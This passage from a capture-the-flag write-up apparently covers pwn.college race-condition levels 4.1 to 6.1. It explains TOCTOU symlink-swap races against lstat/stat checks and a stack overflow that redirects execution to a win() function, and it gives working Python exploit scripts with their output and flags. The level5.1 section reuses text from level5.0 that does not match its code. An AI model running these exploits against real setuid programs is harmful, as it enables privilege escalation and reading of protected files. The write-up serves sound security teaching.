    exit(1);
  }
  if ( (stat_buf.st_mode & 0xF000) == 40960 )
  {
    puts("Error: file is a symlink!");
    exit(1);
  }
  if ( stat_buf.st_size > 256 )
  {
    puts("Error: file is too large!");
    exit(1);
  }
  v3 = open(argv[1], 0);
  read(v3, buf, 0x1000uLL);
  puts("### Goodbye!");
  return 0;
}
```

```c
__uid_t win()
{
  int *v0; // rax
  char *v1; // rax
  __uid_t result; // eax
  int *v3; // rax
  char *v4; // rax

  puts("You win! Here is your flag:");
  flag_fd_5683 = open("/flag", 0);
  if ( flag_fd_5683 >= 0 )
  {
    flag_length_5684 = read(flag_fd_5683, &flag_5682, 0x100uLL);
    if ( flag_length_5684 > 0 )
    {
      write(1, &flag_5682, flag_length_5684);
      return puts("\n");
    }
    else
    {
      v3 = __errno_location();
      v4 = strerror(*v3);
      return printf("\n  ERROR: Failed to read the flag -- %s!\n", v4);
    }
  }
  else
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("\n  ERROR: Failed to open the flag -- %s!\n", v1);
    result = geteuid();
    if ( result )
    {
      puts("  Your effective user id is not 0!");
      return puts("  You must directly run the suid binary in order to have the correct permissions!");
    }
  }
  return result;
}
```

This is identical to level4.0 with one key difference: the `getchar()` pauses are gone, making the race window microseconds wide instead of seconds.

`win()` is never called from `main` - it opens `/flag` directly (hardcoded) and writes the contents to stdout. The goal is to redirect execution there via a stack buffer overflow + return address overwrite.

Checking the address of `win()` in pwndbg:

```text
pwndbg> disassemble win
Dump of assembler code for function win:
   0x00000000004012d6 <+0>:     endbr64
   0x00000000004012da <+4>:     push   rbp
   0x00000000004012db <+5>:     mov    rbp,rsp
   0x00000000004012de <+8>:     lea    rdi,[rip+0xd23]        # 0x402008
   0x00000000004012e5 <+15>:    call   0x401130 <puts@plt>
   0x00000000004012ea <+20>:    mov    esi,0x0
   0x00000000004012ef <+25>:    lea    rdi,[rip+0xd2e]        # 0x402024
   0x00000000004012f6 <+32>:    mov    eax,0x0
   0x00000000004012fb <+37>:    call   0x4011b0 <open@plt>
   0x0000000000401300 <+42>:    mov    DWORD PTR [rip+0x2dba],eax        # 0x4040c0 <flag_fd.5683>
   0x0000000000401306 <+48>:    mov    eax,DWORD PTR [rip+0x2db4]        # 0x4040c0 <flag_fd.5683>
   0x000000000040130c <+54>:    test   eax,eax
   0x000000000040130e <+56>:    jns    0x401359 <win+131>
   0x0000000000401310 <+58>:    call   0x401120 <__errno_location@plt>
   0x0000000000401315 <+63>:    mov    eax,DWORD PTR [rax]
   0x0000000000401317 <+65>:    mov    edi,eax
   0x0000000000401319 <+67>:    call   0x4011d0 <strerror@plt>
   0x000000000040131e <+72>:    mov    rsi,rax
   0x0000000000401321 <+75>:    lea    rdi,[rip+0xd08]        # 0x402030
   0x0000000000401328 <+82>:    mov    eax,0x0
   0x000000000040132d <+87>:    call   0x401160 <printf@plt>
   0x0000000000401332 <+92>:    call   0x401180 <geteuid@plt>
   0x0000000000401337 <+97>:    test   eax,eax
   0x0000000000401339 <+99>:    je     0x4013d0 <win+250>
   0x000000000040133f <+105>:   lea    rdi,[rip+0xd1a]        # 0x402060
   0x0000000000401346 <+112>:   call   0x401130 <puts@plt>
   0x000000000040134b <+117>:   lea    rdi,[rip+0xd36]        # 0x402088
   0x0000000000401352 <+124>:   call   0x401130 <puts@plt>
   0x0000000000401357 <+129>:   jmp    0x4013d0 <win+250>
   0x0000000000401359 <+131>:   mov    eax,DWORD PTR [rip+0x2d61]        # 0x4040c0 <flag_fd.5683>
   0x000000000040135f <+137>:   mov    edx,0x100
   0x0000000000401364 <+142>:   lea    rsi,[rip+0x2d75]        # 0x4040e0 <flag.5682>
   0x000000000040136b <+149>:   mov    edi,eax
   0x000000000040136d <+151>:   call   0x401190 <read@plt>
   0x0000000000401372 <+156>:   mov    DWORD PTR [rip+0x2e68],eax        # 0x4041e0 <flag_length.5684>
   0x0000000000401378 <+162>:   mov    eax,DWORD PTR [rip+0x2e62]        # 0x4041e0 <flag_length.5684>
   0x000000000040137e <+168>:   test   eax,eax
   0x0000000000401380 <+170>:   jg     0x4013a6 <win+208>
   0x0000000000401382 <+172>:   call   0x401120 <__errno_location@plt>
   0x0000000000401387 <+177>:   mov    eax,DWORD PTR [rax]
   0x0000000000401389 <+179>:   mov    edi,eax
   0x000000000040138b <+181>:   call   0x4011d0 <strerror@plt>
   0x0000000000401390 <+186>:   mov    rsi,rax
   0x0000000000401393 <+189>:   lea    rdi,[rip+0xd46]        # 0x4020e0
   0x000000000040139a <+196>:   mov    eax,0x0
   0x000000000040139f <+201>:   call   0x401160 <printf@plt>
   0x00000000004013a4 <+206>:   jmp    0x4013d1 <win+251>
   0x00000000004013a6 <+208>:   mov    eax,DWORD PTR [rip+0x2e34]        # 0x4041e0 <flag_length.5684>
   0x00000000004013ac <+214>:   cdqe
   0x00000000004013ae <+216>:   mov    rdx,rax
   0x00000000004013b1 <+219>:   lea    rsi,[rip+0x2d28]        # 0x4040e0 <flag.5682>
   0x00000000004013b8 <+226>:   mov    edi,0x1
   0x00000000004013bd <+231>:   call   0x401140 <write@plt>
   0x00000000004013c2 <+236>:   lea    rdi,[rip+0xd41]        # 0x40210a
   0x00000000004013c9 <+243>:   call   0x401130 <puts@plt>
   0x00000000004013ce <+248>:   jmp    0x4013d1 <win+251>
   0x00000000004013d0 <+250>:   nop
   0x00000000004013d1 <+251>:   pop    rbp
   0x00000000004013d2 <+252>:   ret
End of assembler dump.
```

### TOCTOU

Without pauses the race window is microseconds wide. We use the same directory maze technique as level2.1 to widen the kernel path resolution time:

```text
Real tree:  top -> a,    a/b/c/d/e/x   = real small file (passes lstat)
Fake tree:  top -> fake, fake/b/c/d/e/x = symlink to bigfile (ROP payload)
```

`lstat("top/b/c/d/e/x")` resolves through `a` and sees a real small file, passing all checks. We then swap `top` to point to `fake` before `open()` runs, so `open("top/b/c/d/e/x")` resolves to `fake/b/c/d/e/x` → symlink → `bigfile`.

### Stack Buffer Overflow + Return Address Overwrite

Same overflow as level4.0. Stack layout:

```text
char buf[256]      →  rbp-190h
struct stat stat_buf  →  rbp-90h
saved rbp          →  rbp
return address     →  rbp+8
```

Offset from `buf` to return address = `0x190 + 8` = **408 bytes**. Payload: 400 bytes padding + 8 bytes to overwrite saved rbp + `win()` address (`0x4012d6`).

### Exploit

```python title="~/script.py" showLineNumbers
import subprocess, time, os
import struct

WIN_ADDR = 0x00000000004012d6

# 400 bytes padding + 8 bytes saved rbp + win() address
payload = b"A" * 400 + b"B" * 8 + struct.pack("<Q", WIN_ADDR)

# Setup maze
os.system("rm -rf a fake top bigfile")
os.system("mkdir -p a/b/c/d/e && echo hi > a/b/c/d/e/x")
os.makedirs("fake/b/c/d/e", exist_ok=True)

with open("bigfile", "wb") as f:
    f.write(payload)

os.system(f"rm -f fake/b/c/d/e/x && ln -s {os.path.abspath('bigfile')} fake/b/c/d/e/x")

print(f"[*] Payload size: {len(payload)} bytes")
print("[*] Starting exploit loop...")

attempt = 0
sleeps = [0.00001, 0.00005, 0.0001, 0.0002, 0.0005, 0.001, 0.002, 0.005]
sleep_idx = 0
sleep_val = sleeps[sleep_idx]

while True:
    attempt += 1

    if attempt % 200 == 0:
        sleep_idx = (sleep_idx + 1) % len(sleeps)
        sleep_val = sleeps[sleep_idx]
        print(f"[*] Attempt {attempt}, trying sleep={sleep_val}")

    try:
        os.remove("top")
    except FileNotFoundError:
        pass
    os.symlink("a", "top")

    proc = subprocess.Popen(
        ["/challenge/babyrace_level4.1", "top/b/c/d/e/x"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )

    time.sleep(sleep_val)

    try:
        os.remove("top")
    except FileNotFoundError:
        pass
    os.symlink("fake", "top")

    out = proc.stdout.read()
    proc.wait()

    if attempt % 200 == 0:
        print(f"    Last output: {out.decode(errors='replace').strip()[-60:]}")

    if b"pwn.college" in out:
        print(f"[+] Got the flag with sleep={sleep_val}!")
        print(out.decode(errors='replace'))
        break
```

```text
hacker@race-conditions~level4-1:~$ python ~/script.py
[*] Payload size: 416 bytes
[*] Starting exploit loop...
[*] Attempt 200, trying sleep=5e-05
    Last output: /challenge/babyrace_level4.1!
###
Error: file is a symlink!
[*] Attempt 400, trying sleep=0.0001
    Last output: /challenge/babyrace_level4.1!
###
Error: file is a symlink!
[*] Attempt 600, trying sleep=0.0002
    Last output: /challenge/babyrace_level4.1!
###
Error: file is a symlink!
[*] Attempt 800, trying sleep=0.0005
    Last output: # Welcome to /challenge/babyrace_level4.1!
###
### Goodbye!
[*] Attempt 1000, trying sleep=0.001
    Last output: # Welcome to /challenge/babyrace_level4.1!
###
### Goodbye!
[*] Attempt 1200, trying sleep=0.002
    Last output: # Welcome to /challenge/babyrace_level4.1!
###
### Goodbye!
[*] Attempt 1400, trying sleep=0.005
    Last output: # Welcome to /challenge/babyrace_level4.1!
###
### Goodbye!
[+] Got the flag with sleep=0.005!
###
### Welcome to /challenge/babyrace_level4.1!
###
### Goodbye!
You win! Here is your flag:
pwn.college{8mY5J_7CMeMw0isLBN2GRaR5HoX.0FOwQDL4ITM0EzW}
```

&nbsp;

## level5.0

> Exploit a complex race condition to read the flag. This race condition involves multiple steps, which makes it less reliable to exploit!

```text
hacker@race-conditions~level5-0:~$ /challenge/babyrace_level5.0
###
### Welcome to /challenge/babyrace_level5.0!
###

Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).

The file opened will be be sent to you.

This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the directory the file is in is owned by root
and that other users are not able to create files in that directory.
babyrace_level5.0: <stdin>:76: main: Assertion `argc > 1' failed.
Aborted
```

The program performs four checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
3. The directory containing the file must be owned by root (`stat` → `st_uid == 0`).
4. The directory must not be group owned by non-root and must not be world-writable (`st_gid == 0`, `st_mode & 2 == 0`).

### Source code analysis

```c title="/challenge/babyrace_level5.0 :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *v3; // rax
  char *v4; // rax
  int v5; // eax
  size_t v6; // rax
  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
  char buf[264]; // [rsp+B0h] [rbp-110h] BYREF
  unsigned __int64 v10; // [rsp+1B8h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows");
  puts("you to open a single file, as specified by the first argument to the program (argv[1]).\n");
  puts("The file opened will be be sent to you.\n");
  puts("This challenge will verify that the file's path does not include \"flag\".");
  puts("This challenge will verify that the file is not a symlink.");
  puts("This challenge will verify that the directory the file is in is owned by root");
  puts("and that other users are not able to create files in that directory.");
  if ( argc <= 1 )
    __assert_fail("argc > 1", "<stdin>", 0x31u, "main");
  if ( strstr(argv[1], "flag") )
  {
    puts("Error: path contains `flag`!");
    exit(1);
  }
  puts("Calling lstat (does not follow symlinks) on the path.\n");
  puts("Paused (press enter to continue)");
  getchar();
  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
  {
    puts("Error: failed to get file status!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 0xF000) == 40960 )
  {
    puts("Error: file is a symlink!");
    exit(1);
  }
  puts("Calling stat (follows symlinks) on the directory.\n");
  puts("Paused (press enter to continue)");
  getchar();
  v3 = strdup(argv[1]);
  v4 = dirname(v3);
  if ( (unsigned int)stat(v4, &stat_buf) == -1 )
  {
    puts("Error: failed to get directory status!");
    exit(1);
  }
  if ( stat_buf.st_uid )
  {
    puts("Error: directory not owned by root!");
    exit(1);
  }
  if ( stat_buf.st_gid )
  {
    puts("Error: directory not group owned by root!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 2) != 0 )
  {
    puts("Error: other users are able to write in this directory!");
    exit(1);
  }
  puts("Paused (press enter to continue)");
  getchar();
  v5 = open(argv[1], 0);
  v6 = read(v5, buf, 0x100uLL);
  write(1, buf, v6);
  puts("### Goodbye!");
  return 0;
}
```

There are now **three pauses** creating two distinct race windows:

```text
Pause 1 → lstat(file)        → checks file is not a symlink
Pause 2 → stat(directory)    → checks dir is root-owned, no world-write
Pause 3 → open(file)         → reads and outputs the file
```

The directory check uses `stat()` which **follows symlinks** - so we can pass a symlink to a root-owned directory and it will follow it and check the target. This is the key: we don't need to own a root-owned directory, we just need to **point at one** when the check runs.

We pass the path `d/x` where `d` is a symlink we control, and swap it between three states across the three pauses:

```text
Pause 1: d -> /home/hacker, x = real file
         lstat("d/x") sees real file -> not a symlink ✓

Pause 2: d -> /etc
         dirname("d/x") = "d" -> stat("d") -> stat("/etc")
         /etc is root-owned, no world-write ✓

Pause 3: d -> /home/hacker, x = symlink to /flag
         open("d/x") = open("/home/hacker/x") = open(/flag) -> reads flag ✓
```

Note that `lstat` only checks the **final component** of the path for being a symlink - intermediate directory symlinks like `d` are followed freely. This is why swapping `d` does not trigger the symlink check.

### Exploit

```python title="~/script.py" showLineNumbers
import subprocess, time, os, warnings
warnings.filterwarnings("ignore")

# Cleanup
for x in ["pivot", "evil"]:
    try:
        if os.path.islink(x):
            os.unlink(x)
        elif os.path.isdir(x):
            os.rmdir(x)
        else:
            os.remove(x)
    except:
        pass

# attacker-controlled dir with symlink to /flag
os.mkdir("evil")
os.symlink("/flag", "evil/passwd")

# initial pivot -> /etc
os.symlink("/etc", "pivot")

print("[*] Starting exploit loop...")
attempt = 0
proc = None

while True:
    attempt += 1

    if proc is not None:
        try: proc.stdin.close()
        except: pass
        try: proc.stdout.close()
        except: pass
        try: proc.kill()
        except: pass
        try: proc.wait()
        except: pass
        proc = None

    # Reset pivot -> /etc for lstat and dir stat checks
    try:
        os.unlink("pivot")
    except FileNotFoundError:
        pass
    os.symlink("/etc", "pivot")

    proc = subprocess.Popen(
        ["/challenge/babyrace_level5.0", "pivot/passwd"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        close_fds=True
    )

    # Pause 1: lstat sees /etc/passwd = real file -> passes symlink check
    time.sleep(0.1)
    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
    except Exception:
        continue

    # Pause 2: stat(dirname) sees /etc -> root-owned, no world-write
    time.sleep(0.05)
    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
    except Exception:
        continue

    # Swap pivot -> evil before open()
    try:
        os.unlink("pivot")
    except FileNotFoundError:
        pass
    os.symlink("./evil", "pivot")

    # Pause 3: open("pivot/passwd") = evil/passwd -> /flag
    time.sleep(0.05)
    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
        proc.stdin.close()
    except Exception:
        continue

    out = proc.stdout.read()
    proc.wait()
    proc = None

    if attempt % 10 == 0:
        print(f"[*] Attempt {attempt}...")

    if b"pwn.college" in out:
        print("[+] Got the flag!")
        print(out.decode(errors='replace'))
        break
```

```text
hacker@race-conditions~level5-0:~$ python ~/script.py
[*] Starting exploit loop...
[*] Attempt 90...
[+] Got the flag!
###
### Welcome to /challenge/babyrace_level5.0!
###

Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).

The file opened will be be sent to you.

This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the directory the file is in is owned by root
and that other users are not able to create files in that directory.
Calling lstat (does not follow symlinks) on the path.

Paused (press enter to continue)
Calling stat (follows symlinks) on the directory.

Paused (press enter to continue)
Paused (press enter to continue)
pwn.college{gXKlwRMMcYar5h7AewIEIbhmQyx.0VOwQDL4ITM0EzW}
### Goodbye!
```

&nbsp;

## level5.1

> Exploit a complex race condition to read the flag. This race condition involves multiple steps, which makes it less reliable to exploit!

```text
hacker@race-conditions~level5-0:~$ /challenge/babyrace_level5.0
###
### Welcome to /challenge/babyrace_level5.0!
###

Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).

The file opened will be be sent to you.

This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the directory the file is in is owned by root
and that other users are not able to create files in that directory.
babyrace_level5.0: <stdin>:76: main: Assertion `argc > 1' failed.
Aborted
```

The program performs four checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
3. The directory containing the file must be owned by root (`stat` → `st_uid == 0`).
4. The directory must not be group owned by non-root and must not be world-writable (`st_gid == 0`, `st_mode & 2 == 0`).

### Source code analysis

```c title="/challenge/babyrace_level5.1 :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *v3; // rax
  char *v4; // rax
  int v5; // eax
  size_t v6; // rax
  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
  char buf[264]; // [rsp+B0h] [rbp-110h] BYREF
  unsigned __int64 v10; // [rsp+1B8h] [rbp-8h]
  v10 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  if ( argc <= 1 )
    __assert_fail("argc > 1", "<stdin>", 0x28u, "main");
  if ( strstr(argv[1], "flag") )
  {
    puts("Error: path contains `flag`!");
    exit(1);
  }
  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
  {
    puts("Error: failed to get file status!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 0xF000) == 40960 )
  {
    puts("Error: file is a symlink!");
    exit(1);
  }
  v3 = strdup(argv[1]);
  v4 = dirname(v3);
  if ( (unsigned int)stat(v4, &stat_buf) == -1 )
  {
    puts("Error: failed to get directory status!");
    exit(1);
  }
  if ( stat_buf.st_uid )
  {
    puts("Error: directory not owned by root!");
    exit(1);
  }
  if ( stat_buf.st_gid )
  {
    puts("Error: directory not group owned by root!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 2) != 0 )
  {
    puts("Error: other users are able to write in this directory!");
    exit(1);
  }
  v5 = open(argv[1], 0);
  v6 = read(v5, buf, 0x100uLL);
  write(1, buf, v6);
  puts("### Goodbye!");
  return 0;
}
```

There are now **three pauses** creating two distinct race windows:

```text
Pause 1 → lstat(file)        → checks file is not a symlink
Pause 2 → stat(directory)    → checks dir is root-owned, no world-write
Pause 3 → open(file)         → reads and outputs the file
```

The directory check uses `stat()` which **follows symlinks** - so we can pass a symlink to a root-owned directory and it will follow it and check the target. This is the key: we don't need to own a root-owned directory, we just need to **point at one** when the check runs.

We pass the path `d/x` where `d` is a symlink we control, and swap it between three states across the three pauses:

```text
Pause 1: d -> /home/hacker, x = real file
         lstat("d/x") sees real file -> not a symlink ✓

Pause 2: d -> /etc
         dirname("d/x") = "d" -> stat("d") -> stat("/etc")
         /etc is root-owned, no world-write ✓

Pause 3: d -> /home/hacker, x = symlink to /flag
         open("d/x") = open("/home/hacker/x") = open(/flag) -> reads flag ✓
```

Note that `lstat` only checks the **final component** of the path for being a symlink - intermediate directory symlinks like `d` are followed freely. This is why swapping `d` does not trigger the symlink check.

### Exploit

```python title="~/script.py" showLineNumbers
#!/usr/bin/env python3

import os
import threading
import subprocess

TARGET = "/challenge/babyrace_level5.1"

# cleanup
for x in ["pivot", "evil"]:
    try:
        if os.path.islink(x):
            os.unlink(x)
        elif os.path.isdir(x):
            os.rmdir(x)
        else:
            os.remove(x)
    except:
        pass

# attacker-controlled dir
os.mkdir("evil")

# symlink to flag
os.symlink("/flag", "evil/passwd")

# initial safe symlink
os.symlink("/etc", "pivot")

def racer():
    while True:
        try:
            os.unlink("pivot")
            os.symlink("/etc", "pivot")

            os.unlink("pivot")
            os.symlink("./evil", "pivot")
        except:
            pass

threading.Thread(target=racer, daemon=True).start()

while True:
    p = subprocess.run(
        [TARGET, "pivot/passwd"],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
    )

    out = p.stdout.decode(errors="ignore")

    if "flag{" in out or "pwn" in out:
        print(out)
        break
```

```text
hacker@race-conditions~level5-1:~$ python ~/script.py
###
### Welcome to /challenge/babyrace_level5.1!
###

pwn.college{wkT7O7pbJKlOX374m8BlRXBVvaW.0FMxQDL4ITM0EzW}
### Goodbye!
```

&nbsp;

## level6.0

> Exploit a complex race condition to read the flag. This race condition involves multiple steps, which makes it less reliable to exploit!

```text
hacker@race-conditions~level6-0:~$ /challenge/babyrace_level6.0
###
### Welcome to /challenge/babyrace_level6.0!
###

Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).

The file opened will be be sent to you.

This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the directory the file is in is owned by root
and that other users are not able to create files in that directory.
babyrace_level6.0: <stdin>:76: main: Assertion `argc > 1' failed.
Aborted
```

The program performs four checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
3. The directory containing the file must be owned by root (`lstat` → `st_uid == 0`).
4. The directory must not be group owned by non-root and must not be world-writable (`st_gid == 0`, `st_mode & 2 == 0`).

### Source code analysis

```c title="/challenge/babyrace_level6.0 :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *v3; // rax
  char *v4; // rax
  int v5; // eax
  size_t v6; // rax
  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
  char buf[264]; // [rsp+B0h] [rbp-110h] BYREF
  unsigned __int64 v10; // [rsp+1B8h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows");
  puts("you to open a single file, as specified by the first argument to the program (argv[1]).\n");
  puts("The file opened will be be sent to you.\n");
  puts("This challenge will verify that the file's path does not include \"flag\".");
  puts("This challenge will verify that the file is not a symlink.");
  puts("This challenge will verify that the directory the file is in is owned by root");
  puts("and that other users are not able to create files in that directory.");
  if ( argc <= 1 )
    __assert_fail("argc > 1", "<stdin>", 0x31u, "main");
  if ( strstr(argv[1], "flag") )
  {
    puts("Error: path contains `flag`!");
    exit(1);
  }
  puts("Calling lstat (does not follow symlinks) on the path.\n");
  puts("Paused (press enter to continue)");
  getchar();
  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
  {
    puts("Error: failed to get file status!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 0xF000) == 40960 )
  {
    puts("Error: file is a symlink!");
    exit(1);
  }
  puts("Calling lstat (does not follow symlinks) on the directory.\n");
  puts("Paused (press enter to continue)");
  getchar();
  v3 = strdup(argv[1]);
  v4 = dirname(v3);
  if ( (unsigned int)lstat(v4, &stat_buf) == -1 )
  {
    puts("Error: failed to get directory status!");
    exit(1);
  }
  if ( stat_buf.st_uid )
  {
    puts("Error: directory not owned by root!");
    exit(1);
  }
  if ( stat_buf.st_gid )
  {
    puts("Error: directory not group owned by root!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 2) != 0 )
  {
    puts("Error: other users are able to write in this directory!");
    exit(1);
  }
  puts("Paused (press enter to continue)");
  getchar();
  v5 = open(argv[1], 0);
  v6 = read(v5, buf, 0x100uLL);
  write(1, buf, v6);
  puts("### Goodbye!");
  return 0;
}
```

This is identical to [level5.0](#level50) with one critical difference: the directory check now uses **`lstat`** instead of `stat`. This means it **does not follow symlinks** on the directory component.

In level5.0 the `pivot -> /etc` trick worked because `stat` followed `pivot` through to `/etc` and checked its metadata. With `lstat`, calling it on `pivot` stops at the symlink itself, returning our uid and not root's, so the ownership check fails.

The solution is to construct a path where `dirname` resolves to something whose **final component is a real root-owned directory**, not a symlink. `lstat` follows all intermediate components freely, only stopping at the final one.

Using the path `pivot/challenge/babyrace_level6.0`:

- `dirname("pivot/challenge/babyrace_level6.0")` = `"pivot/challenge"`
- `lstat("pivot/challenge")` = `pivot` is an intermediate component so it is followed, `challenge` is the final component, checks `/challenge` itself, which is a real root-owned directory ✓

So when `pivot` → `/`:
- `lstat("pivot/challenge/babyrace_level6.0")` = `lstat("/challenge/babyrace_level6.0")` = real file ✓
- `lstat("pivot/challenge")` = `lstat("/challenge")` = root-owned, no world-write ✓

Then swap `pivot` → `./evil` before `open()`:
- `open("pivot/challenge/babyrace_level6.0")` = `open("evil/challenge/babyrace_level6.0")` = symlink → `/flag` ✓

```text
Pause 1: pivot -> /
         lstat("pivot/challenge/babyrace_level6.0") = /challenge/babyrace_level6.0
         real binary file, not a symlink ✓

Pause 2: pivot -> /
         lstat(dirname) = lstat("pivot/challenge") = lstat("/challenge")
         root-owned, no world-write ✓

Pause 3: pivot -> ./evil
         open("pivot/challenge/babyrace_level6.0")
         = evil/challenge/babyrace_level6.0 -> /flag ✓
```

### Exploit

```python title="~/script.py" showLineNumbers
import subprocess, os, warnings, time
warnings.filterwarnings("ignore")

# cleanup
for x in ["pivot", "evil"]:
    try:
        if os.path.islink(x): os.unlink(x)
        elif os.path.isdir(x): os.rmdir(x)
    except: pass

# evil/challenge/babyrace_level6.0 -> /flag
os.makedirs("evil/challenge", exist_ok=True)
try: os.unlink("evil/challenge/babyrace_level6.0")
except: pass
os.symlink("/flag", "evil/challenge/babyrace_level6.0")

TARGET = "/challenge/babyrace_level6.0"
print("[*] Starting exploit loop...")
attempt = 0
proc = None

while True:
    attempt += 1

    # Cleanup previous process
    if proc is not None:
        try: proc.stdin.close()
        except: pass
        try: proc.stdout.close()
        except: pass
        try: proc.kill()
        except: pass
        try: proc.wait()
        except: pass
        proc = None

    # Reset pivot -> /
    try: os.unlink("pivot")
    except: pass
    os.symlink("/", "pivot")

    proc = subprocess.Popen(
        [TARGET, "pivot/challenge/babyrace_level6.0"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        close_fds=True
    )

    # Pause 1: lstat sees /challenge/babyrace_level6.0 = real file ✓
    time.sleep(0.1)
    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
    except Exception:
        continue

    # Pause 2: lstat(dirname) = lstat("pivot/challenge") = lstat("/challenge") = root-owned ✓
    time.sleep(0.05)
    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
    except Exception:
        continue

    # Swap pivot -> evil before open()
    try: os.unlink("pivot")
    except: pass
    os.symlink("./evil", "pivot")

    # Pause 3: open("pivot/challenge/babyrace_level6.0") -> evil/challenge/babyrace_level6.0 -> /flag
    time.sleep(0.05)
    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
        proc.stdin.close()
    except Exception:
        continue

    out = proc.stdout.read()
    proc.wait()
    proc = None

    if attempt % 10 == 0:
        print(f"[*] Attempt {attempt}...")

    if b"pwn.college" in out:
        print("[+] Got the flag!")
        print(out.decode(errors='replace'))
        break
```

```text
hacker@race-conditions~level6-0:~$ python ~/script.py
[*] Starting exploit loop...
[+] Got the flag!
###
### Welcome to /challenge/babyrace_level6.0!
###

Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).

The file opened will be be sent to you.

This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the directory the file is in is owned by root
and that other users are not able to create files in that directory.
Calling lstat (does not follow symlinks) on the path.

Paused (press enter to continue)
Calling lstat (does not follow symlinks) on the directory.

Paused (press enter to continue)
Paused (press enter to continue)
pwn.college{c6bBmyZdAsYHSdVjp1vh-buv2hM.0VMxQDL4ITM0EzW}
### Goodbye!
```

&nbsp;

## level6.1

> Exploit a complex race condition to read the flag. This race condition involves multiple steps, which makes it less reliable to exploit!

```text
hacker@race-conditions~level6-1:~$ /challenge/babyrace_level6.1
###
### Welcome to /challenge/babyrace_level6.1!
###

Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).

The file opened will be be sent to you.

This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the directory the file is in is owned by root
and that other users are not able to create files in that directory.
babyrace_level6.1: <stdin>:76: main: Assertion `argc > 1' failed.
Aborted
```

The program performs four checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
3. The directory containing the file must be owned by root (`lstat` → `st_uid == 0`).
4. The directory must not be group owned by non-root and must not be world-writable (`st_gid == 0`, `st_mode & 2 == 0`).

### Source code analysis

```c title="/challenge/babyrace_level6.1 :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *v3; // rax
  char *v4; // rax
  int v5; // eax
  size_t v6; // rax
  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
  char buf[264]; // [rsp+B0h] [rbp-110h] BYREF
  unsigned __int64 v10; // [rsp+1B8h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  if ( argc <= 1 )
    __assert_fail("argc > 1", "<stdin>", 0x28u, "main");
  if ( strstr(argv[1], "flag") )
  {
    puts("Error: path contains `flag`!");
    exit(1);
  }
